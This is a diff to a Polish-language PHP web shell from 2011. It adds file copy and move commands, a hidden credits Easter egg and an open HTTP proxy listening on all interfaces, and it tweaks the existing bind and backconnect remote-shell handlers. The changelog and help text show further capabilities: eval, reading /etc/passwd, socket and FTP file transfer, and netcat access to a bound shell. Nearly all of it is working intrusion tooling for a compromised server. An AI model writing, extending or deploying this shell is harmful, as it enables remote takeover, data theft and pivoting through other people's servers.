@@ -176,15 +176,15 @@ CONTENT;
 		{
 			ini_set( 'max_execution_time', 0 );
 			ini_set( 'memory_limit', '1024M' );
-			ini_set( 'display_errors', 0 );
-			//ini_set( 'default_socket_timeout', 5 );
+			//ini_set( 'display_errors', 0 );
+			ini_set( 'default_socket_timeout', 5 );
 		}
 
 		/**
 		 * Config
 		 */
-		ignore_user_abort( 1 );
-		//error_reporting( 0 );
+		ignore_user_abort( 0 );
+		error_reporting( -1 );
 
 		/**
 		 * disable_functions
@@ -352,13 +352,75 @@ HELP;
 	}
 
 	/**
+	 * Komenda - cp
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandCp()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+cp, copy - Kopiowanie pliku
+
+	Użycie:
+		cp plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
+HELP;
+		}
+
+		$sOutput = NULL;
+
+		if( ! copy( $this -> aArgv[0], $this -> aArgv[1] ) )
+		{
+			return sprintf( 'Plik "%s" <span class="red">nie został skopiowany</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
+		}
+
+		return sprintf( 'Plik "%s" <span class="green">został skopiowany</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
+	}
+
+	/**
+	 * Komenda - cp
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandMv()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+mv, move - Przenoszenie pliku
+
+	Użycie:
+		mv plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
+HELP;
+		}
+
+		$sOutput = NULL;
+
+		if( ! rename( $this -> aArgv[0], $this -> aArgv[1] ) )
+		{
+			return sprintf( 'Plik "%s" <span class="red">nie został przeniesiony</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
+		}
+
+		return sprintf( 'Plik "%s" <span class="green">został przeniesiony</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
+	}
+
+	/**
 	 * Komenda - game
 	 *
 	 * @ignore
 	 * @access private
 	 * @return string
 	 */
-	private function getCommandGame()
+	private function getCommandG4m3()
 	{
 		/**
 		 * Help
@@ -366,12 +428,14 @@ HELP;
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-game - Gra z komputerem, wspaniała na samotne wieczory ;)
+g4m3 - Gra z komputerem, wspaniała na samotne wieczory ;)
+
+	Sprawdziłeś już komende <strong>:cr3d1ts</strong> ?
 
 	Użycie:
-		echo cyfra_z_przedziału_0-9
+		g4m3 cyfra_z_przedziału_0-9
 
-		echo cyfra_z_przedziału_0-9 [ilość_losowań]
+		g4m3 cyfra_z_przedziału_0-9 [ilość_losowań]
 HELP;
 		}
 
@@ -594,6 +658,8 @@ HELP;
 				{
 					fwrite( $rSock, "\r\nbye ;)" );
 					fclose( $rSock );
+
+					echo 'Zakończono backconnect';
 					exit ;
 				}
 
@@ -627,7 +693,7 @@ bind - Dostęp do powłoki na danym porcie
 		najlepiej uruchomić w nowym oknie
 
 	Przykład:
-		backconnect 6666
+		bind 6666
 
 	NetCat:
 		nc host 6666
@@ -683,7 +749,7 @@ HELP;
 			 */
 			if( ! $rClient && ! ( $rClient = socket_accept( $rSock ) ) )
 			{
-				usleep( 2000 );
+				usleep( 10000 );
 			}
 			else
 			{
@@ -703,9 +769,11 @@ HELP;
 				{
 					if( $sCmd === ':exit' )
 					{
-						socket_write( $rClient, "\r\nbye ;)" );
+						socket_write( $rClient, "\r\nDobranoc ;)" );
 						socket_close( $rSock );
 						socket_close( $rClient );
+
+						echo 'Zakończono bindowanie';
 						exit ;
 					}
 
@@ -1452,6 +1520,354 @@ HELP;
 	}
 
 	/**
+	 * Komenda - chmod
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandCr3d1ts()
+	{
+		return <<<HELP
+Jak to się mówi: <strong>&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;</strong>
+
+Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
+
+Jakies sugestie, pytania ? Piszcie śmiało: <strong>Krzychu</strong> - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
+
+ps, sprawdziłeś komendę <strong>:g4m3</strong> ?
+
+Changelog:
+
+2011-05-20
+----------
+* dodano komendę <strong>proxy</strong>
+
+2011-05-16
+----------
+* Shella rozszerzono o następujące komendy: <strong>cp</strong>, <strong>mv</strong>, <strong>mkdir</strong>, <strong>bind</strong>, <strong>backconnect</strong>,
+  <strong>chmod</strong>, <strong>cr3d1ts</strong>
+* komendy <strong>g4m3</strong> i <strong>cr3d1ts</strong> nie wyświetlają się w helpie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
+
+2011-05-15 v0.1
+---------------
+* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak: <strong>echo</strong>, <strong>eval</strong>,
+  <strong>etcpasswd</strong>, <strong>socketdownload</strong>, <strong>socketupload</strong>, <strong>ftpdownload</strong>, <strong>ftpupload</strong>, <strong>ls</strong>, <strong>cat</strong>,
+  <strong>bcat</strong>, <strong>download</strong>, <strong>help</strong>, <strong>remove</strong>, game</strong>
+HELP;
+	}
+
+
+	private function getCommandProxy()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+proxy - Proxy HTTP
+
+	Proxy nie ma wielowątkowości, i ma poblemy z flushowaniem !!!
+	Należy zmienić ilość polaczeń do serwera
+		Opera:
+			Narzedzia -> Preferencje -> Siec
+			Maksymalna liczba polaczen z serweram: 2
+			Maksymalna laczna liczba polaczen:     8
+
+	Jeśli jedna osoba pobiera duży plik to następne żądania są zablokowane.
+	Blokada jest zwolniona po tym jak użytkownik przerwie lub ściągnie plik
+	Proxy te nie sluży do przeglądania youtuba, a wyłacznie do pobieranie małych plików tekstowych
+
+	Aby zatrzymać serwer nalezy wyslac do niego polecenie ":exit"
+
+
+	Użycie:
+		proxy [opcja] port
+
+	Opcje:
+		-i - ignorowanie obrazków, jeśli wystąpi żądanie na plik .jpg .gif .png .ico .psd .bmp
+		     zostanie wysłany plik graficzny gif 1x1 px
+
+	Przykład:
+		proxy 2222
+		proxy -i 2222
+HELP;
+		}
+
+		/**
+		 * Rozszerzenie "sockets" jes wymagane
+		 */
+		if( ! function_exists( 'socket_create' ) )
+		{
+			return 'Brak rozszerzenia "sockets"';
+		}
+
+		/**
+		 * Sprawdzanie poprawnosci portu
+		 */
+		if( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65535 ) )
+		{
+			return sprintf( 'Błędny port "%d"', $this -> aArgv[0] );
+		}
+
+		/**
+		 * Ustawianie dyrektyw
+		 */
+		if( ! $this -> bSafeMode )
+		{
+			ini_set( 'output_buffering', 0 );
+			ini_set( 'zlib.output_compression', 0 );
+			ini_set( 'implicit_flush', 1 );
+		}
+
+		/**
+		 * Ignorowanie obrazkow: .jpg .gif .png .ico .psd .bmp
+		 */
+		$bIgnoreImages = in_array( 'i', $this -> aOptv );
+
+		/**
+		 * Tworzenie socketa
+		 */
+		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp' ) ) ) )
+		{
+			return "Nie można utworzyć socketa";
+		}
+
+		/**
+		 * Podpinanie
+		 */
+		if( ! socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) )
+		{
+			return sprintf( "Nie można zbindować 0.0.0.0:%d", $this -> aArgv[0] );
+		}
+
+		/**
+		 * Wylaczenie blokowania
+		 */
+		//socket_set_nonblock( $rSock );
+
+		/**
+		 * Nasluchiwanie
+		 */
+		if( ! socket_listen( $rSock ) )
+		{
+			return "Nie można nasłuchiwać\n";
+		}
+
+		header( 'Content-Type: text/plain', TRUE );
+
+		echo "Proxy zostało uruchomione\n\n";
+
+		for(;;)
+		{
+			/**
+			 * Klient
+			 */
+			if( ( $rClient = @ socket_accept( $rSock ) ) === FALSE )
+			{
+				/**
+				 * Zeby obciazenie procesora nie bylo 100%
+				 */
+				usleep( 10000 );
+				continue ;
+			}
+
+			/*
+			 * Naglowki uzytkownika
+			 */
+			$sHeaders = NULL;
+			do
+			{
+				$sTmp = socket_read( $rClient,1024 );
+				$iLen = strlen( $sTmp );
+				$sHeaders .= $sTmp;
+			}
+			while( $iLen === 1024 );
+
+			if( substr( $sTmp, 0, 1 ) === ':' )
+			{
+				$sCommand = rtrim( substr( $sTmp, 1 ) );
+
+				switch( $sCommand )
+				{
+					case 'exit':
+						echo "Command -> exit\n";
+						socket_write( $rClient, "Dobranoc ;)" );
+
+						socket_close( $rClient );
+
+						/*
+						 * Rozlaczenie klienta
+						 */
+						socket_close( $rSock );
+						exit ;
+					case 'ping':
+						echo "Command -> ping\n";
+
+
+						socket_close( $rClient );
+						break ;
+				}
+				continue ;
+			}
+
+			/**
+			 * Wyciaganie hosta do ktorego chcemy sie polaczyc
+			 */
+			if( ! preg_match( '~Host: ([^\r\n]+)~m', $sHeaders, $aHost ) )
+			{
+				socket_close( $rClient );
+				continue ;
+			}
+
+			/**
+			 * zakonczenie proxy, wysterczy w adresie wpisac http://command.exit/
+			 */
+			if( $aHost[1] === 'command.exit' )
+			{
+				echo "Command -> exit\n";
+				socket_write( $rClient, "HTTP/1.1 200 OK\r\n\r\nProxy zakonczylo swoje dzialanie" );
+				socket_close( $rClient );
+				socket_close( $rSock );
+				exit ;
+			}
+
+			/**
+			 * Wyciaganie adresu do ktorego sie laczymy
+			 */
+			if( ! preg_match( '~(GET|POST) (.+) HTTP/1\.(1|0)+~m', $sHeaders, $aGet ) )
+			{
+				socket_close( $rClient );
+				continue ;
+			}
+
+			/**
+			 * Fix dla niektorych serwerow
+			 */
+			$sHeaders = preg_replace(
+				sprintf( '~%s %s HTTP/1.%s~m' , $aGet[1], $aGet[2], $aGet[3] ),
+				sprintf( '%s %s HTTP/1.%s' , $aGet[1], substr( $aGet[2], strlen( 'http://' . $aHost[1] ) ), $aGet[3] ),
+				$sHeaders
+			);
+
+			/**
+			 * Proxy-Connection ... -> Connection
+			 */
+			$sHeaders = preg_replace( '~^Proxy-~m', NULL, $sHeaders );
+
+			/**
+			 * Keep-Alive blokuje caly skrypt, dlatego trzeba zamienic je na polaczenie zamkniete
+			 */
+			$sHeaders = preg_replace( '~^Connection: Keep-Alive~m', 'Connection: Close', $sHeaders );
+
+			/**
+			 * Pobieranie adresu IP poprzez host
+			 */
+			$sIp = getHostByName( $aHost[1] );
+
+			/**
+			 * Statystyki
+			 */
+			printf( "%-90.90s ", $aGet[2] );
+
+			/**
+			 * Ignorowanie obrazkow
+			 */
+			if( $bIgnoreImages && in_array( pathinfo( $aGet[1], PATHINFO_EXTENSION ), array( 'jpg', 'gif', 'png', 'ico', 'psd', 'bmp' ) ) )
+			{
+				echo "Ignore Image\n";
+				$sImageHeader = "HTTP/1.0 200 OK\r\n" .
+						"Content-Type: image/gif\r\n" .
+						"Accept-Ranges: bytes\r\n" .
+						"Expires: Thu, 19 May 2022 12:34:56 GTM\r\n" .
+						"Content-Length: 43\r\n" .
+						"Connection: close\r\n" .
+						"Date: Thu, 19 May 2010 08:06:09 GMT\r\n\r\n" .
+						base64_decode( 'R0lGODlhAQABAIAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw' );
+				socket_write( $rClient, $sImageHeader );
+
+				/**
+				 * Rozlaczenie klienta
+				 */
+				socket_close( $rClient );
+				continue ;
+			}
+
+			/**
+			 * Polaczenie ze zdalnym hostem (do ktorego wysylamy naglowek)
+			 */
+			if( ( $rHost = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp' ) ) ) )
+			{
+
+				/**
+				 * Polaczenie do zdalnego hosta
+				 */
+				if( ! socket_connect( $rHost, $sIp, 80 ) )
+				{
+					echo "Error\n";
+					continue ;
+				}
+
+				/**
+				 * Wysylanie naglowkow
+				 */
+				if( ! socket_write( $rHost, $sHeaders ) )
+				{
+					echo "Error\n";
+					continue ;
+				}
+
+				/**
+				 * Czas rozpoczecia
+				 */
+				$fSpeed = microtime( 1 );
+
+				/**
+				 * Calkowita rozmiar pobranych danych
+				 */
+				$iTotalLen = 0;
+				do
+				{
+					$sTmp = socket_read( $rHost, 1024 );
+					$iLen = strlen( $sTmp );
+
+					/**
+					 * Jezeli pobieramy plik i nagle nacisniemy "Anuluj", zapobiega to
+					 * blokowaniu skryptu
+					 */
+					if( socket_write( $rClient, $sTmp ) === FALSE )
+					{
+						break ;
+					}
+					$iTotalLen += $iLen;
+				}
+				while( $iLen !== 0 );
+
+				/**
+				 * Statystyki
+				 */
+				printf( "Data: %7dKB Speed: %7.2fKB/s\n", ceil( $iTotalLen / 1024 ), ( $iTotalLen / ( microtime( 1 ) - $fSpeed ) / 1024 ) );
+			}
+
+			/**
+			 * Rozlaczenie z hostem
+			 */
+			socket_close( $rHost );
+
+			/**
+			 * Rozlaczenie klienta
+			 */
+			socket_close( $rClient );
+		}
+
+		/**
+		 * Zamykanie socketa (chyba a raczej na pewno sie nigdy nie zamknie)
+		 */
+		socket_close( $rSock );
+		exit ;
+	}
+
+	/**
 	 * Komenda - help
 	 *
 	 * @access private
@@ -1478,7 +1894,7 @@ HELP;
 		foreach( $aMethods as $oClass )
 		{
 			$sClass = $oClass -> getName();
-			if( ( strncmp( $sClass, 'getCommand', 10 ) === 0 ) && ( $sClass !== 'getCommandHelp' ) )
+			if( ( strncmp( $sClass, 'getCommand', 10 ) === 0 ) && ( $sClass !== 'getCommandHelp' ) && ( $sClass !== 'getCommandCr3d1ts' ) && ( $sClass !== 'getCommandG4m3' ) )
 			{
 				$sInfo = $this -> {$sClass}() . "\n\n\n\n";
 				$aCommandsInfo[] = substr( $sInfo, 0, strpos( $sInfo, "\n" ) );
@@ -1526,10 +1942,7 @@ HELP;
 	 */
 	private function getActionBrowser( $sCmd = NULL )
 	{
-		if( $sCmd !== NULL )
-		{
-			$bRaw = TRUE;
-		}
+		$bRaw = ( $sCmd !== NULL );
 
 		/**
 		 * Zawartosc konsoli
@@ -1537,11 +1950,11 @@ HELP;
 		$sConsole = NULL;
 
 		/**
-		 * Domyslna komenda to :ls -lR sciezka_do_katalogu
+		 * Domyslna komenda to :ls -l sciezka_do_katalogu
 		 */
 		if( ( $sCmd === NULL ) && ! Request::isPost() )
 		{
-			$sCmd = ':ls -lR ' . dirname( __FILE__ );
+			$sCmd = ':ls -l ' . dirname( __FILE__ );
 		}
 		else if( $sCmd === NULL )
 		{
@@ -1612,6 +2025,12 @@ HELP;
 				case 'mkdir':
 					$sConsole = $this -> getCommandMkdir();
 					break ;
+				case 'cp':
+					$sConsole = $this -> getCommandCp();
+					break ;
+				case 'mv':
+					$sConsole = $this -> getCommandMv();
+					break ;
 				case 'echo':
 					$sConsole = $this -> getCommandEcho();
 					break ;
@@ -1627,7 +2046,7 @@ HELP;
 					break ;
 				case 'etcpasswd':
 					$sConsole = $this -> getCommandEtcPasswd();
-					break;
+					break ;
 				case 'socketupload':
 				case 'socketup':
 				case 'socketput':
@@ -1650,28 +2069,28 @@ HELP;
 					break ;
 				case 'ls':
 					$sConsole = $this -> getCommandLs();
-					break;
+					break ;
 				case 'bcat':
 				case 'b64':
 					$sConsole = $this -> getCommandBCat();
 					break ;
 				case 'cat':
 					$sConsole = $this -> getCommandCat();
-					break;
+					break ;
 				case 'download':
 				case 'down':
 				case 'get':
 					$sConsole = $this -> getCommandDownload();
-					break;
-				case 'game':
-					$sConsole = $this -> getCommandGame();
-					break;
+					break ;
+				case 'g4m3':
+					$sConsole = $this -> getCommandG4m3();
+					break ;
 				case 'help':
 					$sConsole = $this -> getCommandHelp();
-					break;
+					break ;
 				case $this -> sPhpInfo:
 					$sConsole = $this -> getCommandPhpInfo();
-					break;
+					break ;
 				case 'remove':
 				case 'rm':
 				case 'delete':
@@ -1681,9 +2100,19 @@ HELP;
 				case 'chmod':
 					$sConsole = $this -> getCommandChmod();
 					break ;
+				case 'cr3d1ts':
+					$sConsole = $this -> getCommandCr3d1ts();
+					break ;
+				case 'proxy':
+					$sConsole = $this -> getCommandProxy();
+					break ;
 				default :
 					$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
 			}
+		}
+		elseif( $sCmd === '' )
+		{
+			$sConsole = 'Wpisz <strong>:help</strong> by zobaczyć pomoc';
 		}
 		/**
 		 * Wykonanie komendy systemowej
@@ -1727,13 +2156,12 @@ HELP;
 		}
 		else
 		{
-			$sConsole = 'Safe mode jest włączone, więc exec, shell_exec, passthru, system i fopen nie zadziałają';
+			$sConsole = 'Safe mode jest włączone, więc <strong>exec</strong>, <strong>shell_exec</strong>, <strong>passthru</strong>, <strong>system</strong> i <strong>fopen</strong> nie zadziałają';
 		}
 
 		if( $bRaw )
 		{
 			return strip_tags( $sConsole );
-			exit ;
 		}
 
 		$sContent  = sprintf( '<pre id="console">%s</pre>', $sConsole );
@@ -1767,20 +2195,20 @@ a{color:#226c90;text-decoration:none;}
 a:hover{color:#5a9cbb;text-decoration:underline;}
 h1,h2,h3,h4,h5,h6{margin-top:10px;padding-bottom:5px;color:#054463;border-bottom:1px solid #d0d0d0;}
 table{background-color:#fff;border:1px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;margin:auto;padding:6px;}
-td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0px;padding:0px;padding-left:4px}
-th{color:#054463;font-size:14px;font-weight:bold;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px}
+td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0;padding:0 0 0 4px;}
+th{color:#054463;font-size:14px;font-weight:700;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px;}
 hr{margin-top:20px;background-color:#eef7fb;border:1px solid #eef7fb;}
-div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:940px;background-color:#fff;margin:0 auto;padding:8px 20px 10px 20px}
-div#menu{margin:0 auto;text-align:left;}
-div#bottom{margin:10px auto}
-div#content{margin:0 auto;padding-top:10px}
-pre#console{text-align:left;margin: 0 auto;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;padding:2px;overflow:scroll}
-input{padding:6px;border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;background-color:#fff;font-size:14px}
+div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:940px;background-color:#fff;margin:0 auto;padding:8px 20px 10px;}
+div#menu{text-align:left;margin:0 auto;}
+div#bottom{margin:10px auto;}
+div#content{padding-top:10px;margin:0 auto;}
+pre#console{text-align:left;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;overflow:scroll;margin:0 auto;padding:2px;}
+input{border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;background-color:#fff;font-size:14px;padding:6px;}
 input#cmd{width:89%;margin-top:10px;padding-left:10px;}
 input#cmd:hover{background-color:#f1f1f1;}
 input#cmd-send{margin-top:10px;margin-left:20px;}
-.green{color:#55b855;font-weight:bold}
-.red{color:#fb5555;font-weight:bold}</style>
+.green{color:#55b855;font-weight:700;}
+.red{color:#fb5555;font-weight:700;}</style>
 </head>
 <body>
 </body>
@@ -1791,9 +2219,7 @@ input#cmd-send{margin-top:10px;margin-left:20px;}
 	<div id="content">
 		{$sData}
 	</div>
-	<div id="bottom">
-		(C) 2011 by <strong>krzotr</strong>, Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s
-	</div>
+	<div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s</div>
 </div>
 </html>
 CONTENT;
@@ -1833,4 +2259,4 @@ if( ob_get_length() > 0 )
 	ob_end_flush();
 }
 
-__halt_compiler();
+exit ;
